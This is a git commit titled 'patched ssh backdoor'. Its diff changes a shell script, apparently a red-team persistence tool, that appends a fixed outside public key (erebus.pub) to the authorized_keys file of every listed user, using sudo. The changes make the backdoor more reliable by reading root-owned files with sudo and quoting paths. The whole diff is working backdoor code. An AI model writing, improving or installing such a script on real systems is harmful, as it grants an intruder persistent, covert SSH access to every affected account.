2c0c97a0afd63fa8db55fe9d173d9108df227287
Jack Dunfey <jackdunf@Erebus-2>
2025-03-16 04:31:02 -0400

    patched ssh backdoor

--- insecurity/ssh_keys.sh
+++ insecurity/ssh_keys.sh
@@ -8,19 +8,19 @@ for user in "${USERS[@]}"; do
     sshdir="$home_dir/.ssh"
     auth_keys="$sshdir/authorized_keys"
 
-    if [[ -f $auth_keys ]]; then
-        grep -q "AAAAC3NzaC1lZDI1NTE5AAAAIAbsgQ9t5uKNgyDtQ7IEeJcIkQ6ShMWmjXLev0R+KRID" $auth_keys && continue
+    if sudo test -f $auth_keys; then
+        sudo grep -q "AAAAC3NzaC1lZDI1NTE5AAAAIAbsgQ9t5uKNgyDtQ7IEeJcIkQ6ShMWmjXLev0R+KRID" "$auth_keys" && continue
     fi
 
-    if [[ ! -d $sshdir ]]; then
-        sudo mkdir -p $sshdir
-        sudo chown $user:$(id -gn $user) $sshdir
+    if ! sudo test -d "$sshdir"; then
+        sudo mkdir -p "$sshdir"
+        sudo chown "$user:$(id -gn $user)" "$sshdir"
     fi
 
-    if [[ ! -f $auth_keys ]]; then
-        sudo touch $auth_keys
-        sudo chown $user:$(id -gn $user) $auth_keys
+    if [[ ! -f "$auth_keys" ]]; then
+        sudo touch "$auth_keys"
+        sudo chown "$user:$(id -gn $user)" "$auth_keys"
     fi
 
-    sudo cat ssh_keys/erebus.pub | sudo tee -a $auth_keys
+    sudo cat ssh_keys/erebus.pub | sudo tee -a "$auth_keys"
 done
